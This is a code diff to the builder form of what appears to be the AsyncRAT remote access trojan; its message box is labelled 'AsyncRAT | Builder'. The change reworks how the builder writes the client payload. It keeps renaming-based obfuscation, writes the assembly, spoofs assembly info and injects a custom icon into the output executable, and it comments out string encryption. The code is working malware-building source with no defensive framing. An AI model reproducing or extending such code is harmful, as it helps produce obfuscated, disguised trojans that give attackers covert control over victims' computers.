@@ -199,25 +199,22 @@ namespace Server.Forms
                     if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                     {
                         btnBuild.Enabled = false;
-                        await Task.Run(() =>
+                        WriteSettings(asmDef);
+                        if (chkObfu.Checked)
                         {
-                            WriteSettings(asmDef);
-                            if (chkObfu.Checked)
-                            {
-                                EncryptString.DoEncrypt(asmDef);
-                                Renaming.DoRenaming(asmDef);
-                            }
-                            asmDef.Write(saveFileDialog1.FileName);
-                            asmDef.Dispose();
-                            if (btnAssembly.Checked)
-                            {
-                                WriteAssembly(saveFileDialog1.FileName);
-                            }
-                            if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
-                            {
-                                IconInjector.InjectIcon(saveFileDialog1.FileName, txtIcon.Text);
-                            }
-                        });
+                            //EncryptString.DoEncrypt(asmDef);
+                            Renaming.DoRenaming(asmDef);
+                        }
+                        asmDef.Write(saveFileDialog1.FileName);
+                        asmDef.Dispose();
+                        if (btnAssembly.Checked)
+                        {
+                            WriteAssembly(saveFileDialog1.FileName);
+                        }
+                        if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
+                        {
+                            IconInjector.InjectIcon(saveFileDialog1.FileName, txtIcon.Text);
+                        }
                         MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                         SaveSettings();
                         this.Close();
